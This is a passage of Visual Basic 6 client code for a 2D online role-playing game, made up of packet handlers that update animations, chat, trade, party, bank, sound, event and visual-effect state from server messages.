    message = Buffer.ReadString
    color = Buffer.ReadLong
    tmpType = Buffer.ReadLong
    X = Buffer.ReadLong
    Y = Buffer.ReadLong

    Set Buffer = Nothing
    
    CreateActionMsg message, color, tmpType, X, Y
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleActionMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleBlood(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim X As Long, Y As Long, Sprite As Long, i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    
    X = Buffer.ReadLong
    Y = Buffer.ReadLong

    Set Buffer = Nothing
    
    ' randomise sprite
    Sprite = Rand(1, BloodCount)
    
    ' make sure tile doesn't already have blood
    For i = 1 To MAX_BYTE
        If Blood(i).X = X And Blood(i).Y = Y Then
            ' already have blood :(
            Exit Sub
        End If
    Next
    
    ' carry on with the set
    BloodIndex = BloodIndex + 1
    If BloodIndex >= MAX_BYTE Then BloodIndex = 1
    
    With Blood(BloodIndex)
        .X = X
        .Y = Y
        .Sprite = Sprite
        .Timer = GetTickCount
        .Alpha = 255
    End With
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleBlood", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleAnimation(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    
    AnimationIndex = AnimationIndex + 1
    If AnimationIndex >= MAX_BYTE Then AnimationIndex = 1
    
    'Animation Dir
    
    With AnimInstance(AnimationIndex)
        .Animation = Buffer.ReadLong
        .X = Buffer.ReadLong
        .Y = Buffer.ReadLong
        .locktype = Buffer.ReadByte
        .lockindex = Buffer.ReadLong
        .Used(0) = True
        .Used(1) = True
        .Dir = Buffer.ReadByte
        .IsLinear = Buffer.ReadByte
        .LockToNPC = Buffer.ReadByte
    End With
    
    If AnimInstance(AnimationIndex).Animation > 0 Then
        If Animation(AnimInstance(AnimationIndex).Animation).Tremor > 0 Then
            Tremor = GetTickCount + Animation(AnimInstance(AnimationIndex).Animation).Tremor
        End If
        If Animation(AnimInstance(AnimationIndex).Animation).Buraco > 0 Then
            Call FazerBuraco(AnimInstance(AnimationIndex).X, AnimInstance(AnimationIndex).Y, Animation(AnimInstance(AnimationIndex).Animation).Buraco * 32)
        End If
    End If
    
    ' play the sound if we've got one
    PlayMapSound AnimInstance(AnimationIndex).X, AnimInstance(AnimationIndex).Y, SoundEntity.seAnimation, AnimInstance(AnimationIndex).Animation
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleAnimation", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleMapNpcVitals(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim i As Long
Dim MapNpcNum As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    MapNpcNum = Buffer.ReadLong
    For i = 1 To Vitals.Vital_Count - 1
        MapNpc(MapNpcNum).Vital(i) = Buffer.ReadLong
    Next
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleMapNpcVitals", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCooldown(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Slot As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    Slot = Buffer.ReadLong
    SpellCD(Slot) = GetTickCount
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleCooldown", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleClearSpellBuffer(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, TheIndex As Long
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    
    TheIndex = Buffer.ReadLong
    
    TempPlayer(TheIndex).SpellBuffer = 0
    TempPlayer(TheIndex).SpellBufferTimer = 0
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleClearSpellBuffer", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSayMsg(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim Access As Long
Dim Name As String
Dim message As String
Dim colour As Long
Dim Header As String
Dim PK As Long
Dim saycolour As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    Name = Buffer.ReadString
    Access = Buffer.ReadLong
    PK = Buffer.ReadLong
    message = Buffer.ReadString
    Header = Buffer.ReadString
    saycolour = Buffer.ReadLong
    
    ' Check access level
    If PK = NO Then
        Select Case Access
            Case 0
                colour = White
            Case 1
                colour = DarkGrey
            Case 2
                colour = Cyan
            Case 3
                colour = BrightGreen
            Case 4
                colour = Yellow
        End Select
    Else
        colour = BrightRed
    End If

    AddText Header & Name & ": " & message, colour
        
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSayMsg", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleOpenShop(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim shopnum As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    shopnum = Buffer.ReadLong
    
    Set Buffer = Nothing
    
    OpenShop shopnum
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleOpenShop", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleResetShopAction(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    ShopAction = 0
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleResetShopAction", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleStunned(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, TheIndex As Long, TargetTyp As Byte, Duration As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    TheIndex = Buffer.ReadLong
    TargetTyp = Buffer.ReadByte
    Duration = Buffer.ReadLong
    
    If TargetTyp = TARGET_TYPE_NPC Then
        TempMapNpc(TheIndex).StunDuration = Duration
        TempMapNpc(TheIndex).StunTick = GetTickCount
    Else
        TempPlayer(TheIndex).StunDuration = Duration
    End If
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleStunned", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleBank(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    For i = 1 To MAX_BANK
        Bank.Item(i).Num = Buffer.ReadLong
        Bank.Item(i).Value = Buffer.ReadLong
    Next
    
    InBank = True
    GUIWindow(GUI_BANK).visible = True
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleBank", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTrade(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    InTrade = Buffer.ReadLong
    GUIWindow(GUI_TRADE).visible = True
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTrade", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleCloseTrade(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    InTrade = 0
    GUIWindow(GUI_TRADE).visible = False
    TradeStatus = vbNullString
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleCloseTrade", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTradeUpdate(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim dataType As Byte
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    dataType = Buffer.ReadByte
    
    If dataType = 0 Then ' ours!
        For i = 1 To MAX_INV
            TradeYourOffer(i).Num = Buffer.ReadLong
            TradeYourOffer(i).Value = Buffer.ReadLong
        Next
        YourWorth = Buffer.ReadLong & "g"
    ElseIf dataType = 1 Then 'theirs
        For i = 1 To MAX_INV
            TradeTheirOffer(i).Num = Buffer.ReadLong
            TradeTheirOffer(i).Value = Buffer.ReadLong
        Next
        TheirWorth = Buffer.ReadLong & "g"
    End If
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTradeUpdate", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTradeStatus(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim status As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    status = Buffer.ReadByte
    
    Set Buffer = Nothing
    
    Select Case status
        Case 0 ' clear
            TradeStatus = vbNullString
        Case 1 ' they've accepted
            TradeStatus = "O outro jogador aceitou."
        Case 2 ' you've accepted
            TradeStatus = "Esperando para que o outro jogador aceite."
    End Select
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTradeStatus", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTarget(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    myTarget = Buffer.ReadLong
    myTargetType = Buffer.ReadLong
    
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleTarget", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleHotbar(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim i As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
        
    For i = 1 To MAX_HOTBAR
        Hotbar(i).Slot = Buffer.ReadLong
        Hotbar(i).sType = Buffer.ReadByte
    Next
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleHotbar", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleHighIndex(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    Player_HighIndex = Buffer.ReadLong
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleHighIndex", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSound(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim X As Long, Y As Long, entityType As Long, entityNum As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    X = Buffer.ReadLong
    Y = Buffer.ReadLong
    entityType = Buffer.ReadLong
    entityNum = Buffer.ReadLong
    
    PlayMapSound X, Y, entityType, entityNum
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSound", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleTradeRequest(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim theName As String
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    theName = Buffer.ReadString
    
    Dialogue "Trade Request", theName & " has requested a trade. Would you like to accept?", DIALOGUE_TYPE_TRADE, True
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSound", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePartyInvite(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim theName As String
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()

    theName = Buffer.ReadString
    
    Dialogue "Party Invitation", theName & " has invited you to a party. Would you like to join?", DIALOGUE_TYPE_PARTY, True
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePartyInvite", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePartyUpdate(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, i As Long, inParty As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()

    inParty = Buffer.ReadByte
    
    ' exit out if we're not in a party
    If inParty = 0 Then
        Call ZeroMemory(ByVal VarPtr(Party), LenB(Party))
        ' exit out early
        Exit Sub
    End If
    
    ' carry on otherwise
    Party.Leader = Buffer.ReadLong
    For i = 1 To MAX_PARTY_MEMBERS
        Party.Member(i) = Buffer.ReadLong
    Next
    Party.MemberCount = Buffer.ReadLong
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePartyUpdate", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePartyVitals(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim playerNum As Long, partyIndex As Long
Dim Buffer As clsBuffer, i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    ' which player?
    playerNum = Buffer.ReadLong
    ' set vitals
    For i = 1 To Vitals.Vital_Count - 1
        Player(playerNum).MaxVital(i) = Buffer.ReadLong
        Player(playerNum).Vital(i) = Buffer.ReadLong
    Next
    
    ' find the party number
    For i = 1 To MAX_PARTY_MEMBERS
        If Party.Member(i) = playerNum Then
            partyIndex = i
        End If
    Next
    
    ' exit out if wrong data
    If partyIndex <= 0 Or partyIndex > MAX_PARTY_MEMBERS Then Exit Sub
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePartyVitals", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlayBGM(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim str As String

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    str = Buffer.ReadString
    
    StopMusic
    PlayMusic str
    
    Set Buffer = Nothing
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlayBGM", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandlePlaySound(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim str As String

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    str = Buffer.ReadString

    PlaySound str, -1, -1
    
    Set Buffer = Nothing
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandlePlaySound", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleFadeoutBGM(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim str As String

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    'Need to learn how to fadeout :P
    'do later... way later.. like, after release, maybe never
    StopMusic
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleFadeoutBGM", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleStopSound(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim str As String, i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    For i = 0 To UBound(Sounds()) - 1
        StopSound (i)
    Next
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleFadeoutBGM", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSwitchesAndVariables(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer
Dim str As String, i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    For i = 1 To MAX_SWITCHES
        Switches(i) = Buffer.ReadString
    Next
    
    For i = 1 To MAX_VARIABLES
        Variables(i) = Buffer.ReadString
    Next
    
    Set Buffer = Nothing
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleSwitchesAndVariables", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleChatBubble(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, TargetType As Long, Target As Long, message As String, colour As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    Target = Buffer.ReadLong
    TargetType = Buffer.ReadLong
    message = Buffer.ReadString
    colour = Buffer.ReadLong
    
    AddChatBubble Target, TargetType, message, colour
    Set Buffer = Nothing
Exit Sub
errorhandler:
    HandleError "HandleChatBubble", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleSpecialEffect(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, effectType As Long
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    effectType = Buffer.ReadLong
    
    Select Case effectType
        Case EFFECT_TYPE_FADEIN
            FadeType = 1
            FadeAmount = 0
        Case EFFECT_TYPE_FADEOUT
            FadeType = 0
            FadeAmount = 255
        Case EFFECT_TYPE_FLASH
            FlashTimer = GetTickCount + 150
        Case EFFECT_TYPE_FOG
            CurrentFog = Buffer.ReadLong
            CurrentFogSpeed = Buffer.ReadLong
            CurrentFogOpacity = Buffer.ReadLong
        Case EFFECT_TYPE_WEATHER
            CurrentWeather = Buffer.ReadLong
            CurrentWeatherIntensity = Buffer.ReadLong
        Case EFFECT_TYPE_TINT
            CurrentTintR = Buffer.ReadLong
            CurrentTintG = Buffer.ReadLong
            CurrentTintB = Buffer.ReadLong
            CurrentTintA = Buffer.ReadLong
    End Select
    Set Buffer = Nothing
Exit Sub
errorhandler:
    HandleError "HandleSpecialEffect", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Private Sub HandleFlash(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim Buffer As clsBuffer, Target As Long, n As Byte
    
    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    
    Buffer.WriteBytes Data()
    Target = Buffer.ReadLong
    n = Buffer.ReadByte
    If n = 1 Then
        TempMapNpc(Target).StartFlash = GetTickCount + 200
    Else
        TempPlayer(Target).StartFlash = GetTickCount + 200
    End If
    Set Buffer = Nothing
    
    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleFlash", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub
Private Sub HandleMapReport(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim MapNum As Integer

    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    frmMapReport.lstMaps.Clear
    
    For MapNum = 1 To MAX_MAPS
        frmMapReport.lstMaps.AddItem MapNum & ": " & Buffer.ReadString
    Next MapNum
    
    frmMapReport.Show
    
    Set Buffer = Nothing
End Sub

Private Sub HandleCreateProjectile(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim AttackerIndex As Long
    Dim TargetIndex As Long
    Dim TargetType As Long
    Dim GrhIndex As Long
    Dim Rotate As Long
    Dim RotateSpeed As Long
    Dim NPCAttack As Byte
    Dim Buffer As clsBuffer
    Set Buffer = New clsBuffer
    
    Call Buffer.WriteBytes(Data())

    AttackerIndex = Buffer.ReadLong
    TargetIndex = Buffer.ReadLong
    TargetType = Buffer.ReadLong
    GrhIndex = Buffer.ReadLong
    Rotate = Buffer.ReadLong
    RotateSpeed = Buffer.ReadLong
    NPCAttack = Buffer.ReadByte
    
    'Create the projectile
    Call CreateProjectile(AttackerIndex, TargetIndex, TargetType, GrhIndex, Rotate, RotateSpeed, NPCAttack)
    
End Sub

Public Sub Events_HandleEventUpdate(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim d As Long, DCount As Long

    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    CurrentEventIndex = Buffer.ReadLong
    With CurrentEvent
        .Type = Buffer.ReadLong
        GUIWindow(GUI_EVENTCHAT).visible = Not (.Type = Evt_Quit)
        inChat = Not (.Type = Evt_Quit)
        'Textz
        DCount = Buffer.ReadLong
        If DCount > 0 Then
            ReDim .Text(1 To DCount)
            ReDim chatOptState(1 To DCount)
            .HasText = True
            For d = 1 To DCount
                .Text(d) = Buffer.ReadString
            Next d
        Else
            Erase .Text
            .HasText = False
            ReDim chatOptState(1 To 1)
        End If
        'Dataz
        DCount = Buffer.ReadLong
        If DCount > 0 Then
            ReDim .Data(1 To DCount)
            .HasData = True
            For d = 1 To DCount
                .Data(d) = Buffer.ReadLong
            Next d
            Else
            Erase .Data
            .HasData = False
        End If
    End With
    
    Set Buffer = Nothing
End Sub

Public Sub Events_HandleEventData(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim Buffer As clsBuffer
    Dim EIndex As Long, S As Long, SCount As Long, d As Long, DCount As Long

    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    
    EIndex = Buffer.ReadLong
    If EIndex <= 0 Or EIndex > MAX_EVENTS Then Exit Sub
    
    Events(EIndex).Name = Buffer.ReadString
    Events(EIndex).chkSwitch = Buffer.ReadByte
    Events(EIndex).chkVariable = Buffer.ReadByte
    Events(EIndex).chkHasItem = Buffer.ReadByte
    Events(EIndex).SwitchIndex = Buffer.ReadLong
    Events(EIndex).SwitchCompare = Buffer.ReadByte
    Events(EIndex).VariableIndex = Buffer.ReadLong
    Events(EIndex).VariableCompare = Buffer.ReadByte
    Events(EIndex).VariableCondition = Buffer.ReadLong
    Events(EIndex).HasItemIndex = Buffer.ReadLong
    SCount = Buffer.ReadLong
    If SCount > 0 Then
        ReDim Events(EIndex).SubEvents(1 To SCount)
        Events(EIndex).HasSubEvents = True
        For S = 1 To SCount
            With Events(EIndex).SubEvents(S)
                .Type = Buffer.ReadLong
                'Textz
                DCount = Buffer.ReadLong
                If DCount > 0 Then
                    ReDim .Text(1 To DCount)
                    .HasText = True
                    For d = 1 To DCount
                        .Text(d) = Buffer.ReadString
                    Next d
                Else
                    Erase .Text
                    .HasText = False
                End If
                'Dataz
                DCount = Buffer.ReadLong
                If DCount > 0 Then
                    ReDim .Data(1 To DCount)
                    .HasData = True
                    For d = 1 To DCount
                        .Data(d) = Buffer.ReadLong
                    Next d
                Else
                    Erase .Data
                    .HasData = False
                End If
            End With
        Next S
    Else
        Events(EIndex).HasSubEvents = False
        Erase Events(EIndex).SubEvents
    End If
    
    Events(EIndex).Trigger = Buffer.ReadByte
    Events(EIndex).WalkThrought = Buffer.ReadByte
    
    Set Buffer = Nothing
End Sub

Public Sub Events_HandleEventEditor(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
    Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Events
        Editor = EDITOR_EVENT
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_EVENTS
            .lstIndex.AddItem i & ": " & Trim$(Events(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        EventEditorInit
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "Events_HandleEventEditor", "modEvents", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleEffectEditor()
Dim i As Long

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    With frmEditor_Effect
        Editor = EDITOR_EFFECT
        .lstIndex.Clear

        ' Add the names
        For i = 1 To MAX_EFFECTS
            .lstIndex.AddItem i & ": " & Trim$(Effect(i).Name)
        Next

        .Show
        .lstIndex.ListIndex = 0
        'EffectEditorInit
    End With

    ' Error handler
    Exit Sub
errorhandler:
    HandleError "HandleEffectEditor", "modHandleData", Err.Number, Err.Description, Err.Source, Err.HelpContext
    Err.Clear
    Exit Sub
End Sub

Sub HandleUpdateEffect(ByVal Index As Long, ByRef Data() As Byte, ByVal StartAddR As Long, ByVal ExtraVar As Long)
Dim n As Long
Dim Buffer As clsBuffer
Dim EffectSize As Long
Dim EffectData() As Byte

    ' If debug mode, handle error then exit out
    If Options.Debug = 1 Then On Error GoTo errorhandler
    
    Set Buffer = New clsBuffer
    Buffer.WriteBytes Data()
    n = Buffer.ReadLong
